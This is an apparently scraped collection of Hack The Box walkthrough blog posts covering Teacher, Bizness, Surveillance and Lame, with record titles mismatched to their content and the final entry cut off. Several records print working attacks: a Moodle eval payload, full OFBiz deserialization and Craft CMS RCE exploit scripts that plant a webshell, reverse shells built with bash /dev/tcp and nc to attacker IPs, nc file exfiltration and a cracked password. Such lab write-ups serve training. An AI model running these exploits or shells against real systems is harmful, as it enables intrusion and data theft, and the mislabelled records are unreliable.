        "content": "Teacher is an easy Linux box created by mrh4sh on Hack The Box. The official walkthrough states that it’s a medium box. However, it is categorized as an easy box in the machines section. It is recommended that you have basic Linux and MySQL knowledge to complete this box. By completing this box you will learn Website Enumeration, Password Brute-Forcing, Moodle Quiz Module Exploitation, Database Enumeration, Password Cracking, and Linux Symlink Misconfiguration. Hello world, welcome to Haxez where today I will be explaining how I hacked Teacher.\nTeacher Enumeration\nFirst, I spawned the box and connected my attack box to the Hack The Box VPN. Once connected, I sent a ping request to the box to ensure it was online. Then I performed a Nmap scan to check what ports were open. Furthermore, I requested the service versions, asked for default scripts to be run, and that the minimum packet rate was 10000. Finally, I saved the output in all formats to files called teacher. From the results, I learned that only port 80 for HTTP was open and that it was running Apache 2.4.25.\nsudo nmap -sC -sV -p- 10.129.202.224 --min-rate 10000 -oA teacher\nTeacher Web Application Enumeration\nSince port 80 was the only open port, I headed over to the application. There wasn’t a great deal of functionality offered by the application. It seemed fairly generic with few pages that I could interact with. For an application that calls itself Blackhat Highschool, it seemed a bit too clean. I was hoping for something dark and edgy.\nMoving on, I ran whatweb against the application which told me it was an HTML 5 application with JQuery 1.11.1. Next, I navigated to index pages with various different extensions (index.html, index.php). Sure enough, the one that loaded the main page was index.html.\nAs I didn’t have much to go on, I decided to run gobuster to look for hidden content. Perhaps there was a hidden directory or a secret file telling me that the princess is in another castle. I told gobuster to perform a directory attack using the raft-small-words.txt wordlist in SecLists. Furthermore, I also asked it to try various different extensions and set the thread count to 50.\nAs a result, I learned that there was a directory called Moodle. Their GitHub page explains that Moodle is a free and open-source learning management system written in PHP and distributed under the GNU General Public License. Moodle is used for blended learning, distance education flipped classrooms, and other online learning projects in schools, universities, workplaces, and other sectors. I headed to the Moodle directory but received an error because it redirected to teacher.htb. Therefore, I added the IP address and teacher.htb domain to my /etc/hosts file and revisited the directory. Abracadabra, the site started loading.\nPicture In Picture\nI honestly don’t know what to say about this part of the box. I know I wouldn’t have found it if it wasn’t for a walkthrough. It’s not something I regularly check. I found Moodle but had no way to log in. However, directory listing on the images directory was enabled. Visiting each of the images loaded an image as expected, except for 5.png.\nI downloaded the picture locally and used less to review the contents of the file. It wasn’t an image at all. It appeared to be a helpdesk ticket. I can’t fathom how a helpdesk ticket would have ended up on the website. For my own sanity, I’m going to pretend that the helpdesk agent and web developer are the same person. Furthermore, I’m also going to pretend that they accidentally renamed the wrong file and uploaded it. The ticket gave me the username Giovanni and a partial password of Th4C00lTeacha.\nMoodle Bruteforce\nI launched Burp and headed back to the Moodle login page. Next, I populated the login form with the credentials provided in the support ticket. Then, I clicked submit and located the login request in Burp’s HTTP history. I sent the request to the intruder tool and added a character to the end of the password. Then, I highlighted that character and added the payload characters.\nNext, I navigated to the payload tab but because I’m using Burp community edition, I had to create my own payloads. As a result, I combined several wordlists from the SecLists fuzzing directory so that they contained numbers 0 to 9, all alphabetical characters (lower and uppercase), and all special characters.\nI then click the start attack button and watched as Burp went through each payload, appending it to the end of the password. There are other tools that I could have used to do this such as WFUZZ or FFUF but I know how to use Burp so I thought it was the best option. An indication that a specific payload has had a different result is the length of the response produced by the application. The screenshot below shows that most of the responses were 868 characters. However, the payload with the # symbol produced a response with 993 characters.\nEvil Teacher Vulnerability\nI wasn’t sure what the Moodle version was. I ran what web again against the teacher.htb domain Moodle directory but got nothing. As a result, I looked on Google and found that the Moodle version can be found from the Moodle Docs for this page link at the bottom of a course page. This told me that it was Moodle version 3.4.\nThere is a vulnerability in Moodle 3.4 with the CVE designation CVE-2018–1133. The vulnerability is also known as Evil Teacher. It could allow a user with the teacher role to perform code execution by creating a quiz. SonarSource has an excellent writeup on it so I’m not going to attempt to explain it in too much detail. Essentially, formulas are passed to an eval function which allows for code execution. So if a threat actor can create a quiz with a malicious formula in one of the questions, they may be able to execute code.\nTeacher Foothold\nI navigated to the algebra page and enabled editing. Next, I used the add an activity or resource option to add a quiz to the Topic 1 section.\nI gave the quiz a name and description and clicked next.\nAfter that, I clicked the little blue add link on the next page and chose to add a question. Then, I selected the calculated question type as that would be likely to have the option to add a formula. Finally, I pasted the working exploit into the formula and changed the grad value to 100%.\n/*{a*/`$_GET[0]`;//{x}}\nIt was time for the moment of truth. I captured the request with Burp and sent it to the repeater tool. Next, I appended the URL with a payload that would ping my box. I started tcpdump to listen out for ICMP packets that hit my tun0 adaptor and clicked send.\nGET /moodle/question/question.php?returnurl=%2Fquestion%2Fedit.php%3Fcmid%3D7&appendqnumstring&scrollpos=0&id=6&wizardnow=datasetitems&cmid=7&0=/bin/ping+10.10.14.34 HTTP/1.1\nsudo tcpdump -i tun0 -n icmp\nTo my surprise, it worked the first time. I started receiving ping packets from the target box.\nNow that I had code execution, I modified my payload to a reverse shell, started netcat, and was able to pop a reverse shell.\nGET /moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D8%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=6&wizardnow=datasetitems&cmid=8&0=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.34/9001+0>%261' HTTP/1.1\nTeacher System Enumeration\nI couldn’t find the user flag once logged in so I checked the home directory and that there was a user called giovanna. That’s probably where the user.txt file is. I could try switching to that user with the password we logged in to Moodle with. However, I decided to take a look at the database first. I pulled the username and password from the /var/www/html/moodle/config.php file. After logging in, I was able to grab usernames and password hashes from the mdl_users table.\nselect id,username,password from mdl_user;\nI copied the Giovannibak hash to a file on my attack box and used John to crack it with the rockyou wordlist.\nI was then able to switch to the giovanni user and capture the user.txt flag.\nwww-data@teacher:/var/www/html/moodle$ su giovannisu giovanniPassword: expelledgiovanni@teacher:/var/www/html/moodle$ cd ~/cd ~/giovanni@teacher:~$ lslsuser.txt  workgiovanni@teacher:~$ cat user.txtcat user.txt881▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓823\nTeacher Privilege Escalation\nThe box keeps crashing meaning I have to do the above process all over again. As a result, the following explanation is going to be brief because I simply can’t be bothered with this box anymore. Looking at the time stamps on the user’s home directory I could see that something was changing fairly frequently. I set up a Python webserver and download pspy onto the box. Running pspy I noticed that a backup script was running.\nThe backup script was changing to the /home/giovanni/work directory and then backing up the courses directory. It was then changing the directory to /home/giovanni/work/tmp and changing the permissions to 777.\ngiovanni@teacher:/var/www/html/moodle/question$ cat /usr/bin/backup.sh#!/bin/bashcd /home/giovanni/work;tar -czvf tmp/backup_courses.tar.gz courses/*;cd tmp;tar -xf backup_courses.tar.gz;chmod 777 * -R;\nYou may have to forgive me here as I’ve reached the end of my tether. I had to restart the box about 5 times due to it crashing repeatedly. All I did was create a symbolic link from courses to /root. That way, when the script runs, the contents of the root directory will be backed up to work/tmp/courses which will allow me to capture the root flag.\ngiovanni@teacher:~/work$ ln -s /root coursesgiovanni@teacher:~/work$ ls -laSh coursesgiovanni@teacher:~/work$ lscourses  courses.bak  tmpgiovanni@teacher:~/work$ cd tmpgiovanni@teacher:~/work/tmp$ lsbackup_courses.tar.gz  coursesgiovanni@teacher:~/work/tmp$ cd coursesgiovanni@teacher:~/work/tmp/courses$ lsalgebra  root.txtgiovanni@teacher:~/work/tmp/courses$ cat root.txtcat root.txt63d▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓3cc\nTeacher Learnings\nIronically, I didn’t learn a lot from the teacher box. The Moodle exploit was interesting as I hadn’t done it before but that was about it. Unfortunately, I have to say that this is one of my least favorite boxes that I’ve completed so far. The concept is nice but the box was too flakey, well for me it was anyway. It seemed that the slightest mistake in syntax caused the box to throw a tantrum. This is on a private VIP box too so not like other people were hitting it.\nI think enabling SSH would have made the box more tolerable as it would have allowed quick access to the user. I wouldn’t want this on every box but having to repeat the Moodle exploit every time the box decided to stop responding made me want to quit. Also what was up with the credentials hidden in the image… Oh well, it’s done now and I can put it behind me. Glad I did it but didn’t enjoy it. Thanks for the box!"
    },
    {
        "title": "Hack The Box (Surveillance) | by Software Sinner - Medium",
        "link": "https://software-sinner.medium.com/hack-the-box-surveillance-5a0c8f716e53",
        "content": "import argparseimport loggingimport osimport subprocessimport base64import requestsimport urllib3# Disable SSL verification warning for simplicityurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)def validate_url(url):    \"\"\"    Validate the URL schema.    \"\"\"    if not url.startswith(\"http://\") and not url.startswith(\"https://\"):        raise ValueError(\"Invalid URL schema. Use 'http://' or 'https://'.\")def scan(url):    \"\"\"    Perform a basic scan on the specified URL.    \"\"\"    print(\"[+] Scanning started...\")    try:        target_url = f\"{url}/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y\"        response = requests.get(target_url, verify=False)        response.raise_for_status()  # Raise an HTTPError for bad responses (4xx or 5xx)        if \"PONG\" in response.text:            print(\"[+] Apache OFBiz instance seems to be vulnerable.\")        else:            print(\"[-] Apache OFBiz instance seems NOT to be vulnerable.\")    except requests.exceptions.RequestException as e:        print(f\"[-] LOG: An error occurred during the scan: {e}\")def get_encoded_payload(cmd):    \"\"\"    Generate an encoded payload based on the provided command.    \"\"\"    if not os.path.isfile(\"ysoserial-all.jar\"):        logging.error(\"[-] ysoserial-all.jar not found. Exiting.\")        exit(1)    print(\"[+] Generating payload...\")    try:        #print(f\"[+] Running the following command: {cmd}\")        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, text=False)        encoded_output = base64.b64encode(result.stdout).decode().replace(\"\\n\", \"\")        print(\"[+] Payload generated successfully.\")    except subprocess.CalledProcessError as e:        print(f\"[-] LOG: An error occurred during payload generation: {e}\")    return encoded_outputdef send_post_request(url, encoded_output):    \"\"\"    Send a POST request with a malicious serialized payload.    \"\"\"    print(\"[+] Sending malicious serialized payload...\")    try:        target_url = f\"{url}/webtools/control/xmlrpc/?USERNAME=&PASSWORD=&requirePasswordChange=Y\"        headers = {            \"Content-Type\": \"application/xml\",        }        xml_data = f\"\"\"<?xml version=\"1.0\"?>            <methodCall>              <methodName>Methodname</methodName>              <params>                <param>                  <value>                    <struct>                      <member>                        <name>test</name>                        <value>                          <serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">{encoded_output}</serializable>                        </value>                      </member>                    </struct>                  </value>                </param>              </params>            </methodCall>        \"\"\"        response = requests.post(target_url, headers=headers, data=xml_data, verify=False)        if response.status_code == 200:            print(\"[+] The request has been successfully sent. Check the result of the command.\")        else:            print(\"[-] Failed to send the request. Check the connection or try again.\")    except requests.exceptions.RequestException as e:        print(f\"[-] LOG: An error occurred during the scan: {e}\")def main():    \"\"\"    Main function for executing the script.    \"\"\"    parser = argparse.ArgumentParser(description=\"Exploit script for Apache EFBiz auth vulnerability (CVE-2023-49070 and CVE-2023-51467).\")    parser.add_argument(\"--url\", required=True, help=\"EFBIZ's URL to send requests to.\")    parser.add_argument(\"--cmd\", help=\"Command to run on the remote server. Optional.\")    args = parser.parse_args()    url = args.url.rstrip('/')    validate_url(args.url)    if args.cmd is None:        scan(url)    else:        command = f\"java -jar --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED ysoserial-all.jar CommonsBeanutils1 '{args.cmd}'\"        encoded_output = get_encoded_payload(command)        send_post_request(url, encoded_output)if __name__ == \"__main__\":    main()\nAnalyzing the python script here is a breakdown of what its doing:\n* Import necessary libraries: The script imports several Python libraries, including argparse for command-line argument parsing, logging for logging messages, os for interacting with the operating system, subprocess for running external commands, base64 for encoding and decoding data in Base64 format, requests for making HTTP requests, and urllib3 to disable SSL verification warnings.\n* Define a function validate_url(url) to check the URL schema: This function is used to ensure that the provided URL starts with either “http://” or “https://.\" If the URL does not match this format, it raises a ValueError.\n* Define a function scan(url) to perform a basic scan: This function constructs a target URL based on the provided URL and sends an HTTP GET request to it. It looks for the presence of “PONG” in the response text, indicating a vulnerability in the Apache OFBiz instance. If “PONG” is found, it prints that the instance seems to be vulnerable; otherwise, it prints that it’s not vulnerable.\n* Define a function get_encoded_payload(cmd) to generate an encoded payload: This function generates an encoded payload based on a provided command. It checks if the ysoserial-all.jar file exists and then runs the provided command using subprocess.run. It encodes the command’s output in Base64 format and returns the encoded payload as a string.\n* Define a function send_post_request(url, encoded_output) to send a POST request: This function constructs an XML-RPC POST request with a malicious serialized payload and sends it to a target URL. It sets the Content-Type header to “application/xml” and includes the encoded payload in the XML data. It checks the HTTP response status code to determine whether the request was successful.\n* Define the main() function: This is the main entry point of the script. It uses argparse to parse command-line arguments, including the target URL ( — url) and an optional command ( — cmd) to execute on the remote server. It validates the URL, and if no command is provided, it calls the scan() function to check for the Apache OFBiz vulnerability. If a command is provided, it generates the payload and sends the malicious request.\n* Execute the script if it’s the main module: The script checks if it’s being run as the main module (not imported as a library) and calls the main() function to start the execution.\nSince the script is allowing commands to be executed on the server I set up a netcat listener on my machine and when running the exploit I specified the netcat command to call back to my machine:\nOn my attack machine:\nIn another terminal window in the directory where the exploit resides:\npython3 exploit.py --url https://bizness.htb/ --cmd 'nc -e /bin/sh <your ip here> 4444'\nI got a shell as user ofbiz hell yeah! This shell sucked so I ran the following command to upgrade it to a more stable one:\n/usr/bin/script -qc /bin/bash /dev/null\nGetting root was hard for me. I ran to Linpeas and didn’t see anything that could lead me to finding privesc. I had to peek through files on the system to see if I could find a hash or password because I did notice that the Derby database was being used, so I went to the directory path where it was storing its .dat files.\nI ran this command to narrow down which files had “SHA” in them for a hash:\nThe file c54d0.dat had the hash I was looking for..\nfind /opt/ofbiz/runtime/data/derby/ofbiz/seg0 -type f -name “*.dat” -exec grep “SHA” {} \\;\nThe file c54d0.dat ended up having the hash I was looking for after some trial an error.\nThe next step is cracking the hash to obtain a password. I chopped the beginning strings of the hash “$SHA$d$” and converted them using Cyberchef; that way, I could run hashcat against it."
    },
    {
        "title": "Keep Calm and Hack The Box — Lame | by Sonya Moisset",
        "link": "https://medium.com/sonyamoisset/keep-calm-and-hack-the-box-lame-b36f818bdf32",
        "content": "Step 1 — Scanning the network\nThe first step before exploiting a machine is to do a little bit of scanning and reconnaissance.\nThis is one of the most important parts as it will determine what you can try to exploit afterwards. It is always better to spend more time on that phase to get as much information as you could.\nI will use Nmap (Network Mapper). Nmap is a free and open source utility for network discovery and security auditing. It uses raw IP packets to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics.\nThere are many commands you can use with this tool to scan the network. If you want to learn more about it, you can have a look at the documentation here\nI use the following command to get a basic idea of what we are scanning\n-sV: Probe open ports to determine service/version info\n-O: Enable OS detection\n-F: Fast mode — Scan fewer ports than the default scan\n— version-light: Limit to most likely probes (intensity 2)\n10.10.10.3: IP address of the Lame box\nYou can also use Zenmap, which is the official Nmap Security Scanner GUI. It is a multi-platform, free and open source application which aims to make Nmap easy for beginners to use while providing advanced features for experienced Nmap users.\nI use a different set of commands to perform an intensive scan\n-A: Enable OS detection, version detection, script scanning, and traceroute\n-v: Increase verbosity level\n10.10.10.3: IP address of the Lame box\nIf you find the results a little bit too overwhelming, you can move to the Ports/Hosts tab to only get the open ports\nWe can see that there are 4 open ports:\nPort 21. File Transfer Protocol (FTP) control (command)\nPort 22. Secure Shell (SSH), secure logins, file transfers (scp, sftp) and port forwarding\nPort 139. NetBIOS Session Service\nPort 445. Microsoft-DS (Directory Services) SMB file sharing\nLet see what we can get with the first port\nStep 2 — The Vulnerable FTP\nWe will use Searchsploit to check if there’s any known vulnerability on vsftpd 2.3.4. Searchsploit is a command line search tool for Exploit Database\nI use the following command\nNow that we know that there is a vulnerability — Backdoor Command Execution — let’s try to exploit it\nWe will use Metasploit. It’s a penetration testing framework that makes hacking simple. It’s an essential tool for many attackers and defenders\nI launch Metasploit Framework on Kali and look for command I should use to launch the exploit\nI use the command to look for all the payloads available\nWe can see there are several different exploits but the one we’re interested in is number 4\nI use the following command for the exploit\nThis will launch the exploit. I use this command to display the available options\nYou can see that the remote host (RHOSTS) is not yet set. I will set both the remote host and the target as these two pieces of information are needed to run the exploit\nI use the following command to set the remote host using the IP address of HTB Lame box\nThen I set the target to 0 as displayed when I checked the options\nWe can now run the exploit\nUnfortunately we can see that even if the exploit is completed, no session was created. The vulnerability has been patched as mentioned here, in the description of the exploit.\nThis module exploits a malicious backdoor that was added to the VSFTPD download archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was removed on July 3rd 2011.\nThe Exploit Database is a Common Vulnerabilities and Exposures (CVE) compliant archive of public exploits and corresponding vulnerable software, developed for use by penetration testers and vulnerability researchers. The aim is to serve the most comprehensive collection of exploits gathered through direct submissions, mailing lists, as well as other public sources, and present them in a freely-available and easy-to-navigate database. The Exploit Database is a repository for exploits and proof-of-concepts rather than advisories, making it a valuable resource for those who need actionable data right away\nWe need to find another way. Let’s have a look at another port!\nYou can read the whole article on freeCodeCamp News website"
    },
    {
        "title": "Hack The Box (Bizness) | by Software Sinner - Medium",
        "link": "https://software-sinner.medium.com/hack-the-box-bizness-60728bcde635",
        "content": "Hello hackers!!!As promised here’s the second part of my Unleash Your Inner Hacker: Where to Start in Hack The Box?\nIn the first part,we introduced the platform, we covered HTB Academy with suggested modules to get started right away. And above all, we talked about the importance of community.\nBear in mind that the tone of these articles should be perceived as a “friendly conversation” like I was sharing these if I met you in person and we started talking about one of our favorite subjects, hacking.\nHTB Meetup — Lisbon\nBy now you know that at the end of the day, it’s all about learning. You chose your HTB Academy modules, you studied them thoroughly you took your notes maybe you even attended a couple of meetups in person. You’re studying and practicing all of those concepts we talked about. But now you want to get down to business.\nslide from HTB — Lisbon meetup\nI’m with you. It’s time to get your feet wet. To get a real taste of things.\nwww.hackthebox.com/hacker/hacking-labs\nThese are virtual penetration testing labs, with simulating up-to-date security vulnerabilities and misconfiguration for you to train and explore.\nThis is the place where you’ll be testing the skills and knowledge you’ll acquire in your journey. What’s amazing about these labs is precisely the possibility of learning all the latest attack paths and exploit techniques. All in a safe, legal, and secure environment.\nI’m overwhelmed by the possibilities, so many options…\nEasy Elliot. The best place for your to start is precisely the STARTING POINT\nslide from HTB — Lisbon meetup\nThis is where you’ll learn the basics of Penetration Testing in an actionable, structured, comprehensive way. Yes, you’ll be hacking!\nThe machines/boxes you’ll be hacking in Starting Point are separated by Tiers according to their technical difficulty. Start with Tier 0 and build up from there.\nDoes this mean I will not need HTB Academy?\nHTB Academy will always be with you. As we discussed previously. Academy provides guided training and industry certifications. Companies from all over the world use this resource to train their professionals. A valuable resource from beginners to seasoned experts.\nYou can pair your STARTING POINThacking withyourHTB Academy studies and modules. Every Tier has an associated module from HTB Academy, these will give you the guidance you’ll need regarding the technology and subjects you have to learn and master in order to solve those machines.\nwww.hackthebox.com/hacker/hacking-labs\nTake it slow and steady. Do it in a structured way. What I mean by this is to resist the urge to ‘jump’ from machine to machine if you encounter difficulties. Be sure to solve them in order.\nDo not expect to solve a machine quickly and easily. It’s supposed to be a challenge. If you’re not fully understanding what you’re dealing with I recommend taking a step back, reading, practice those HTB Academy once again.\nYou can always refer to the official Walkthroughs HTB made available for every machine on Starting Point. It’s okay to use them. These provide learning opportunities. Just make sure you do not follow them blindly. Try to understand the concepts behind every step. Study them. Reproduce the steps by yourself, and try to anticipate the next step.\nHow To Play Machines\nIf you want a full, comprehensive rundown of navigating and interacting with HTB Labs I suggest taking a look at How to Play Machines by Ryan Gordon.\nYou are not alone!\nRemember to join the HTB community:\nFeel supported, and get involved. Either on Discord, Forum, or join a meetup group. If you’re near Portugal, let’s connect and join the next in-person meetup.\nHack The Box Meetup: Portugal\nTo be continued…\nIn part 3 We’ll start to drill down on more HTB features and the next steps. Reach out and tell me if this is something it might interest you.\nHack all the things! Have all the fun! This is the way!\nDisclaimer! This writeup contains affiliate links."
    },
    {
        "title": "Hack The Box (Devvortex) - Software Sinner - Medium",
        "link": "https://software-sinner.medium.com/hack-the-box-devvortex-9cc1ad2961b5",
        "content": "I’ve been on the Hack The Box platform for many years now and It sharpens my hacking skills. This machine was one of my favorites to hack. It was a Medium level machine and I am proud of myself for owning it. The machine goes over a heavy enumeration that leads to exploiting Craft CMSto get a low-level shell on the server. Privilege escalation was performed by doing a local port-forward with ssh exploiting ZoneMinder.\nThey are always watching you…\nEnumeration:\nI blastedautoreconat the IP and got back only two ports which was sweet. I served up all of my scan results from autorecon to my Python local HTTP server. This helps me stay organized when viewing my results in a web browser.\nsudo $(which autorecon) <Target IP Here>\nIn another terminal window while autorecon is running:\npython -m http.server 80\nNmap Results:\nNmap scan report for 10.10.11.245Host is up, received user-set (0.076s latency).Scanned at 2024-02-13 15:51:45 PST for 72sNot shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE REASON         VERSION22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=|   256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://surveillance.htb/|_http-server-header: nginx/1.18.0 (Ubuntu)| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS\nVisiting the IP in Firefox It was trying to communicate with the domain surveillance.htb. I mapped the domain to the machine's IP in the/etc/hosts file.\nsudo nano /etc/hosts\nRevisiting the IP back in my browser resolved it to the domain and was able to access the page.\nThe company offers Cameras, Intrusion, Perimeter Security, Access Control & Intercom services.\nThe first thing I always do when navigating a web page is analyze it by hitting ctrl-u on my keyboard for the“View Page Source” functionality in Firefox. I had the wappalyzerextension installed also so this gave me some info on what technologies the server was using.\nI did a keyword search in the view page source ctrl-f for “CMS” and came across some version information.\nExploitation:\nDoing some googling of the version I found an exploit on Github that this person spoiled for us since it's related to this machine.\nThanks anyway dude 😏.\n#!/usr/bin/env python3#coding: utf-8# Exploit Title: Craft CMS unauthenticated Remote Code Execution (RCE)# Date: 2023-12-26# Version: 4.0.0-RC1 - 4.4.14# Vendor Homepage: https://craftcms.com/# Software Link: https://github.com/craftcms/cms/releases/tag/4.4.14# Tested on: Ubuntu 22.04.3 LTS# Tested on: Craft CMS 4.4.14# Exploit Author: Olivier Lasne# CVE : CVE-2023-41892# References :# https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g# https://blog.calif.io/p/craftcms-rceimport requestsimport sys, reif(len(sys.argv) < 2):    print(f\"\\033[1;96mUsage:\\033[0m python {sys.argv[0]} \\033[1;96m<url>\\033[0m\")    exit()HOST = sys.argv[1]if not re.match('^https?://.*', HOST):    print(\"\\033[1;31m[-]\\033[0m URL should start with http or https\")    exit()print(\"\\033[1;96m[+]\\033[0m Executing phpinfo to extract some config infos\")## Execute phpinfo() and extract config info from the websiteurl = HOST + '/index.php'content_type = {'Content-Type': 'application/x-www-form-urlencoded'}data = r'action=conditions/render&test[userCondition]=craft\\elements\\conditions\\users\\UserCondition&config={\"name\":\"test[userCondition]\",\"as xyz\":{\"class\":\"\\\\GuzzleHttp\\\\Psr7\\\\FnStream\",\"__construct()\":[{\"close\":null}],\"_fn_close\":\"phpinfo\"}}'try:    r = requests.post(url, headers=content_type, data=data)except:    print(f\"\\033[1;31m[-]\\033[0m Could not connect to {HOST}\")    exit()# If we succeed, we should have default phpinfo credits if not 'PHP Group' in r.text: print(f'\\033[1;31m[-]\\033[0m {HOST} is not exploitable.') exit()# Extract config value for tmp_dir and document_rootpattern1 = r'<tr><td class=\"e\">upload_tmp_dir<\\/td><td class=\"v\">(.*?)<\\/td><td class=\"v\">(.*?)<\\/td><\\/tr>'pattern2 = r'<tr><td class=\"e\">\\$_SERVER\\[\\'DOCUMENT_ROOT\\'\\]<\\/td><td class=\"v\">([^<]+)<\\/td><\\/tr>'tmp_dir       = re.search(pattern1, r.text, re.DOTALL).group(1)document_root = re.search(pattern2, r.text, re.DOTALL).group(1)if 'no value' in tmp_dir: tmp_dir = '/tmp'print(f'temporary directory: {tmp_dir}')print(f'web server root: {document_root}')## Create shell.php in tmp_dirdata = {    \"action\": \"conditions/render\",    \"configObject[class]\": \"craft\\elements\\conditions\\ElementCondition\",    \"config\": '{\"name\":\"configObject\",\"as \":{\"class\":\"Imagick\", \"__construct()\":{\"files\":\"msl:/etc/passwd\"}}}'}files = {    \"image1\": (\"pwn1.msl\", \"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>    <image>    <read filename=\"caption:<?php @system(@$_REQUEST['cmd']); ?>\"/>    <write filename=\"info:DOCUMENTROOT/shell.php\"/>    </image>\"\"\".replace(\"DOCUMENTROOT\", document_root), \"text/plain\")}print(f'\\033[1;96m[+]\\033[0m create shell.php in {tmp_dir}')r = requests.post(url, data=data, files=files) #, proxies={'http' : 'http://127.0.0.1:8080'}) #  # Use the Imagick trick to move the webshell in DOCUMENT_ROOTdata = {    \"action\": \"conditions/render\",    \"configObject[class]\": r\"craft\\elements\\conditions\\ElementCondition\",    \"config\": '{\"name\":\"configObject\",\"as \":{\"class\":\"Imagick\", \"__construct()\":{\"files\":\"vid:msl:' + tmp_dir + r'/php*\"}}}'}print(f'\\033[1;96m[+]\\033[0m trick imagick to move shell.php in {document_root}')r = requests.post(url, data=data) #, proxies={\"http\": \"http://127.0.0.1:8080\"})if r.status_code != 502:    print(\"\\033[1;31m[-]\\033[0m Exploit failed\")    exit()print(f\"\\n\\033[1;95m[+]\\033[0m Webshell is deployed: {HOST}/\\033[1mshell.php\\033[0m?cmd=whoami\")print(f\"\\033[1;95m[+]\\033[0m Remember to \\033[1mdelete shell.php\\033[0m in \\033[1m{document_root}\\033[0m when you're done\\n\")print(\"\\033[1;92m[!]\\033[0m Enjoy your shell\\n\")url = HOST + '/shell.php'## Pseudo Shellwhile True:    command = input('\\033[1;96m>\\033[0m ')    if command == 'exit':        exit()    if command == 'clear' or command == 'cls':        print('\\n' * 100)        print('\\033[H\\033[3J', end='')        continue    data = {'cmd' : command}    r = requests.post(url, data=data) #, proxies={\"http\": \"http://127.0.0.1:8080\"})    # exit if we have an error    if r.status_code != 200:        print(f\"Error: status code {r.status_code} for {url}\")        exit()    res_command = r.text    res_command = re.sub('^caption:', '', res_command)    res_command = re.sub(' CAPTION.*$', '', res_command)    print(res_command, end='')\nOkay let's at least do a breakdown of what this exploit code is doing:\nThis Python script is an exploit for a vulnerability (CVE-2023–41892) in Craft CMS, versions 4.0.0-RC1 through 4.4.14, which allows unauthenticated remote code execution (RCE).\n* Usage Check: The script checks if it has been provided with the required command-line argument (the URL of the vulnerable Craft CMS instance).\n* Execute PHPInfo: Sends a request to the target Craft CMS instance to execute phpinfo() and extract configuration information.\n* Extract Configuration: Parses the response from phpinfo() to extract values for upload_tmp_dir and $_SERVER[‘DOCUMENT_ROOT’].\n* Create Shell: Constructs a malicious PHP file (shell.php) with code that allows command execution on the server.\n* Upload Shell: Uploads the malicious PHP file to the target server using a crafted request. It uses an Imagick trick to move the shell to the document root.\n* Interactive Shell: Once the shell is deployed, the script enters an interactive mode where it allows the user to execute commands on the target system through the uploaded shell.\n* Clean-Up: Provides instructions on how to delete the uploaded shell after use.\nsudo git clone https://github.com/Faelian/CraftCMS_CVE-2023-41892cd CraftCMS_CVE-2023-41892python3 craft-cms.py http://surveillance.htb/\nThe shell that was given to me was absolutely trash so I decided to run another reverse shell back to my machine.\nOn my attack machine:\nnc -nlvp 1234\nOn the target machine:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your IP here> 1234 >/tmp/f/usr/bin/script -qc /bin/bash /dev/null\nPost-Exploitation:\nThe next step for me since I was only www-data, wasto enumerate the system for password files, etc. I pushed linpeas onto the machine and found some juicy stuff that led me to an insane amount of rabbit holes.\nSorry, Alice sometimes it be like that.\nI took note of the passwords discovered and connected to the MySQL databases found password hashes tried to break them and got nothing…\nLooking back at my Linpeas results I found this interesting file:\nvar/www/html/craft/storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip\nI pushed the file onto my machine so I could analyze it further.\nOn my attack machine:\nnc -l -p <port>  > surveillance--2023-10-17-202801--v4.4.14.sql.zip\nOn the target machine:\nnc <attackers ip> <port> < surveillance--2023-10-17-202801--v4.4.14.sql.zip\nOpened the file with gedit and did a ctr-f related to users that I found on the system or passwords and came across a hash for Matthew.\nRan a hash-identifier to discover what type of hash I was working with and it was SHA-256.\nThrew the hash into a file ran Johnny Boy the Ripper on it and then sshd onto the machine.\njohn hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256\nNice password Matthew you nerd!\nusername: matthewpassword: starcraft122490\nsudo ssh -oHostKeyAlgorithms=+ssh-dss matthew@10.10.11.245\nI ran linpeas again and revisited the section where it highlighted open active ports and port 8080 was interesting to me.\nTo access this port I needed to do an SSH Local Port Forward. A local Port redirects traffic from a local port on the client machine to a specified port on a remote server through an SSH connection.\nOn my attack machine I ran:\nssh -L 2222:127.0.0.1:8080 matthew@10.10.11.245\nVisited my localhost IP in a browser on port 2222 and was 